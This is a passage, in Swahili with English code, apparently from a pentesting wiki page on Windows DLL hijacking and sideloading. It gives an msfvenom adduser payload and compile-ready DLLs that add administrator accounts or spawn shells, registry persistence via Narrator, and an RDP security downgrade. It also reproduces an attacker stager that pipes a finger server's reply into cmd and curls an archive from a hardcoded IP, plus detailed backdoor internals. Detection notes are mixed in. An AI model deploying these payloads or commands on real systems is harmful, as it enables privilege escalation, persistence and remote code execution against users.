msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

Mara nyingi, DLL unayokompile lazima **iexport kila function inayoimportiwa na process lengwa**. Ikiwa export inayohitajika haipo, binary haiwezi kuirekebisha na exploit itashindwa.

<details>
<summary>Kiolezo cha C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL ya C mbadala yenye sehemu ya kuingilia ya thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Uchunguzi kifani: Utekaji wa Narrator OneCore TTS Localization DLL (Accessibility/ATs)

Windows Narrator.exe bado hukagua DLL ya localization inayotabirika na mahususi kwa lugha wakati wa kuanza, ambayo inaweza kutekwa ili kutekeleza msimbo wowote na kupata persistence.<sup>[[7]](#references)</sup>

Mambo muhimu
- Njia inayokaguliwa (matoleo ya sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (matoleo ya awali): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayodhibitiwa na mshambulizi inaweza kuandikiwa ipo kwenye njia ya OneCore, hupakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa Procmon
- Kichujio: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia kutoka kwenye njia iliyo hapo juu.

DLL ya msingi
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Ukimya wa OPSEC
- Hijack ya kawaida itatoa sauti/kuangazia UI. Ili kufanya hili kimya, wakati wa attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uisimamishe kwa `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>

Kuanzisha na kudumisha ufikiaji kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa mipangilio iliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandikizwa. Ukiwa kwenye secure desktop (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.

Utekelezaji wa SYSTEM unaoanzishwa na RDP (kusonga baadaye)
- Ruhusu safu ya kawaida ya usalama ya RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host; kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji husimama kipindi cha RDP kinapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili ingizo la registry la Accessibility Tool (AT) iliyojengewa ndani (kwa mfano, CursorIndicator), kulihariri ili lielekeze kwenye binary/DLL yoyote, kulileta, kisha kuweka `configuration` kuwa jina hilo la AT. Hii hufanya utekelezaji wowote upitie mfumo wa Accessibility.

Maelezo
- Kuandika kwenye `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwekwa ndani ya `DLL_PROCESS_ATTACH`; exports hazihitajiki.

## Uchunguzi wa Kisa: CVE-2025-1729 - Kuongeza Haki kwa Kutumia TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Udhaifu

- **Kipengele**: `TPQMAssistant.exe` iliyoko `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu watumiaji wa ndani kuweka faili zozote.
- **Tabia ya Kutafuta DLL**: Hujaribu kwanza kupakia `hostfxr.dll` kutoka kwenye saraka yake ya kufanya kazi na huandika "NAME NOT FOUND" ikiwa haipo, jambo linaloonyesha kuwa utafutaji kwenye saraka ya ndani hupewa kipaumbele.

### Utekelezaji wa Exploit

Mshambuliaji anaweza kuweka stub hasidi ya `hostfxr.dll` kwenye saraka hiyo hiyo, na kutumia DLL inayokosekana ili kutekeleza code katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mtiririko wa Mashambulizi

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyoratibiwa iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inaendeshwa, DLL hasidi itaendeshwa katika kipindi cha msimamizi chenye integrity ya kati.
4. Unganisha mbinu za kawaida za UAC bypass ili kupata mamlaka ya SYSTEM kutoka integrity ya kati.

## Uchunguzi Kifani: MSI CustomAction Dropper + DLL Side-Loading kupitia Host Iliyosainiwa (wsc_proxy.exe)

Wahusika tishio mara nyingi huunganisha droppers za MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliosainiwa.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimyakimya wakati wa usakinishaji wa GUI (k.m., kitendo cha LaunchApplication au VBScript), na kujenga upya hatua inayofuata kutoka kwenye rasilimali zilizopachikwa.
- Dropper huandika EXE halali iliyosainiwa na DLL hasidi kwenye saraka moja (jozi ya mfano: wsc_proxy.exe iliyosainiwa na Avast + wsc.dll inayodhibitiwa na mshambuliaji).
- EXE iliyosainiwa inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye saraka ya kufanya kazi, na kutekeleza msimbo wa mshambuliaji chini ya mchakato mama uliosainiwa (ATT&CK T1574.001).

Uchambuzi wa MSI (cha kutafuta)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo wa kutiliwa shaka: LaunchApplication inayoendesha faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/zigawanywa ndani ya CAB ya MSI:
  - Toa kwa njia ya kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande vidogo vingi vinavyounganishwa na kusimbuliwa na CustomAction ya VBScript. Mtiririko wa kawaida:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: programu mwenyeji halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye folda yake.
  - wsc.dll: DLL ya mshambuliaji. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na uelekeze exports zinazohitajika kwenye maktaba halisi huku ukiendesha payload kwenye DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano, DLLirant/Spartacus) ili kuzalisha DLL ya forwarding ambayo pia hutekeleza payload yako.

- Mbinu hii hutegemea jinsi host binary inavyotatua majina ya DLL. Ikiwa host hutumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), huenda hijack isifaulu.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri mpangilio wa kipaumbele na lazima zizingatiwe unapochagua host binary na seti ya exports.

## Triad zilizosainiwa + payloads zilizosimbwa kwa njia fiche (uchunguzi kifani wa ShadowPad)

Check Point ilieleza jinsi Ink Dragon inavyosambaza ShadowPad kwa kutumia **triad ya faili tatu** ili kufanana na software halali huku payload kuu ikiwa imesimbwa kwa njia fiche kwenye diski:<sup>[[12]](#references)</sup>

1. **EXE ya host iliyosainiwa** – wachuuzi kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Wavamizi hubadilisha jina la executable ili ionekane kama binary ya Windows (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode hubaki halali.
2. **Loader DLL hasidi** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Kwa kawaida DLL ni binary ya MFC iliyofichwa kwa kutumia framework ya ScatterBrain; kazi yake pekee ni kutafuta blob iliyosimbwa kwa njia fiche, kuifungua, na kufanya reflective mapping ya ShadowPad.
3. **Blob ya payload iliyosimbwa kwa njia fiche** – mara nyingi huhifadhiwa kama `<name>.tmp` katika saraka hiyo hiyo. Baada ya kufanya memory-mapping ya payload iliyofunguliwa, loader hufuta faili ya TMP ili kuharibu ushahidi wa uchunguzi wa kidijitali.

Vidokezo vya tradecraft:

* Kubadilisha jina la EXE iliyosainiwa (huku ukihifadhi `OriginalFileName` ya awali kwenye kichwa cha PE) huiwezesha kujifanya binary ya Windows huku ikiendelea kuwa na sahihi ya mchuuzi. Kwa hiyo, iga mazoea ya Ink Dragon ya kuweka binary zinazoonekana kama `conhost.exe` lakini kwa kweli ni zana za AMD/NVIDIA.
* Kwa kuwa executable inaendelea kuaminika, vidhibiti vingi vya allowlisting vinahitaji tu DLL yako hasidi iwekwe kando yake. Lenga kubinafsisha loader DLL; kwa kawaida parent iliyosainiwa inaweza kuendeshwa bila kubadilishwa.
* Decryptor ya ShadowPad inahitaji blob ya TMP iwe karibu na loader na iweze kuandikwa ili iweze kufuta faili baada ya mapping. Acha saraka iweze kuandikwa hadi payload ipakie; ikiwa kwenye memory, faili ya TMP inaweza kufutwa kwa usalama kwa OPSEC.

### Mlolongo wa LOLBAS stager + staged archive sideloading (finger → tar/curl → WMI)

Waendeshaji huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum iliyo kwenye diski iwe DLL hasidi iliyo karibu na EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Loader ya amri za mbali (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, hupakua amri kutoka kwa seva ya Finger, na kuzituma kwa `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` hupata maandishi kupitia TCP/79; `| cmd` hutekeleza jibu la server, hivyo kuruhusu waendeshaji kubadilisha server ya second stage upande wa server.

- **Upakuaji/uchimbuaji uliojengewa ndani:** Pakua archive yenye extension isiyo na madhara, ifungue, kisha weka sideload target pamoja na DLL chini ya folder ya `%LocalAppData%` iliyochaguliwa bila mpangilio:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha taarifa ya maendeleo na kufuata uelekezaji mwingine; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **Uzinduzi wa WMI/CIM:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM inapopakia DLL iliyo kwenye saraka hiyo hiyo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea DLL za ndani (k.m., `intelbq.exe`, `nearby_share.exe`); payload (k.m., Remcos) huendeshwa chini ya jina linaloaminika.

- **Uwindaji:** Weka tahadhari kwa `forfiles` pale `/p`, `/m`, na `/c` zinapoonekana pamoja; si jambo la kawaida nje ya scripts za admin.


## Uchunguzi wa Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi majuzi wa Lotus Blossom ulitumia vibaya mnyororo wa update unaoaminika kuwasilisha dropper iliyopakiwa kwa NSIS, iliyoweka DLL sideload pamoja na payloads zinazoishi kikamilifu kwenye memory.<sup>[[13]](#references)</sup>

Mtiririko wa mbinu
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka alama ya **HIDDEN**, huweka Bitdefender Submission Wizard `BluetoothService.exe` iliyopewa jina jipya, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huzindua EXE.
- EXE ya host hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` huifungua kwa kutumia mkondo maalum unaotegemea LCG (konstanti **0x19660D** / **0x3C6EF35F**, nyenzo ya key inayotokana na hash ya awali), huandika juu ya buffer kwa shellcode ya plaintext, hufungua temp, kisha hurukia humo.
- Ili kuepuka IAT, loader hutatua APIs kwa ku-hash majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia avalanche ya mtindo wa Murmur (**0x85EBCA6B**) na kulinganisha na hash za target zenye salt.

Shellcode kuu (Chrysalis)
- Hufungua moduli kuu inayofanana na PE kwa kurudia add/XOR/sub kwa key `gQ2JR&9;` katika mipito mitano, kisha hupakia `Kernel32.dll` → `GetProcAddress` ili kukamilisha utatuzi wa import.
- Huunda upya strings za majina ya DLL wakati wa utekelezaji kwa kutumia mabadiliko ya bit-rotate/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila jedwali la export katika blocks za baiti 4 kwa kuchanganya kwa mtindo wa Murmur, na kutumia `GetProcAddress` tu ikiwa hash haipatikani.

Usanidi uliopachikwa na C2
- Config iko ndani ya faili iliyowekwa ya `BluetoothService` kwenye **offset 0x30808** (ukubwa **0x980**) na hufunguliwa kwa RC4 kwa key `qwhvb^435h&*7`, ikifichua URL ya C2 na User-Agent.
- Beacons huunda wasifu wa host uliotenganishwa kwa nukta, huweka tag `4Q` mwanzoni, kisha huusimba kwa RC4 kwa key `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu hufunguliwa kwa RC4 na kutumwa kulingana na ubadilishaji wa tag (`4T` shell, `4V` utekelezaji wa process, `4W/4X` uandishi wa faili, `4Y` usomaji/exfil, `4\\` uondoaji, `4` uorodheshaji wa drive/faili + hali za uhamishaji wa vipande).
- Hali ya utekelezaji hudhibitiwa na CLI args: bila args = sakinisha persistence (service/Run key) inayoelekeza kwa `-i`; `-i` huzindua upya yenyewe kwa `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyoonekana
- Uvamizi huohuo uliweka Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa kando yake. C source iliyotolewa na mshambuliaji ilipachika shellcode, ika-compile na kuendeshwa kwenye memory bila kuweka PE kwenye disk. Iga kwa kutumia:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hatua hii ya compile-and-run inayotumia TCC iliingiza `Wininet.dll` wakati wa runtime na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja kwenye code, na hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa ni uendeshaji wa compiler.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya minyororo ya DLL sideloading huongeza **uimarishaji wa uthabiti** ili host halali iendelee kufanya kazi kwa muda wa kutosha na kupakia hatua zinazofuata vizuri, badala ya ku-crash baada ya DLL hasidi kupakiwa.<sup>[[11]](#references)</sup>

Muundo ulioonekana
- Weka EXE inayoaminika karibu na DLL hasidi kwa kutumia jina la dependency linalotarajiwa, kama `version.dll`.
- DLL hasidi **hufanya proxy ya kila export inayotarajiwa** kwenda kwa DLL halisi ya mfumo (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili utatuzi wa imports uendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, DLL hasidi **hupatch entry point ya host** ili main thread iingie kwenye kitanzi kisicho na mwisho cha `Sleep` badala ya kutoka au kuendesha njia za code zitakazosimamisha mchakato.
- Thread mpya hufanya kazi hasidi halisi: kusimbua jina au path ya DLL ya hatua inayofuata (RC4/XOR hutumika sana), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Proxying ya kawaida ya DLL hudumisha uoanifu wa API, lakini haihakikishi kuwa host itaendelea kufanya kazi kwa muda wa kutosha kwa hatua zinazofuata.
- Kusimamisha main thread kwenye `Sleep(INFINITE)` ni njia rahisi ya kuacha mchakato uliosainiwa ukiendelea kufanya kazi huku loader ikifanya usimbuaji, staging au bootstrap ya mtandao kwenye worker thread.
- Kuwinda `DllMain` inayotia shaka pekee kunaweza kukosa muundo huu ikiwa tabia inayovutia hutokea baada ya entry point ya host kupatchiwa na thread ya pili kuanza.

Mtiririko mfupi wa kazi
1. Nakili EXE ya host iliyosainiwa na utambue DLL inayotafutwa kutoka kwenye directory ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuzielekeza kwa DLL halali.
3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, tengeneza worker thread.
4. Kutoka kwenye thread hiyo, patch entry point ya host au main thread start routine ili izunguke kwenye `Sleep`.
5. Simbua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au ufanye manual-map ya payload.

Viashiria vya uchunguzi wa kiusalama
- Michakato iliyosainiwa inayopakia `version.dll` au library nyingine za kawaida zinazofanana kutoka kwenye directory yao ya application badala ya `System32`.
- Memory patches kwenye entry point ya mchakato muda mfupi baada ya image kupakiwa, hasa jumps/calls zinazoelekezwa kwa `Sleep`/`SleepEx`.
- Threads zinazoundwa na proxy DLL na mara moja kuita `LoadLibrary` kwenye DLL ya pili yenye jina lililosimbuliwa.
- Proxy DLL zinazotoa exports zote zikiwekwa karibu na vendor executables ndani ya staging directories zinazoweza kuandikwa, kama `ProgramData`, `%TEMP%` au paths za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya kiintelijensia: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kuongeza Privilege kwa Kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Inapeleka Malware Mpya Inayolenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Maradufu wa Kidijitali: Muundo wa Kampeni za Uigaji Zinazobadilika Zinazosambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi Yanayokutana: Uchambuzi wa Makundi ya Vitisho Yanayolenga Serikali ya Kusini-mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Jinsi Operesheni ya Kijanja Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchambuzi wa Kina wa Zana za Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia Kampeni za Ujasusi za 2026 za APT ya Iran, Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Kipengele cha `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Kipengele cha `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Kipengele cha `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Kipengele cha `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Kipengele cha `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Kipengele cha `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Mwendo wa Kasi: Operesheni za Nimbus Manticore Wakati wa Mgogoro wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Inalenga Serikali na Miundombinu Muhimu ya Kusini-mashariki mwa Asia](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
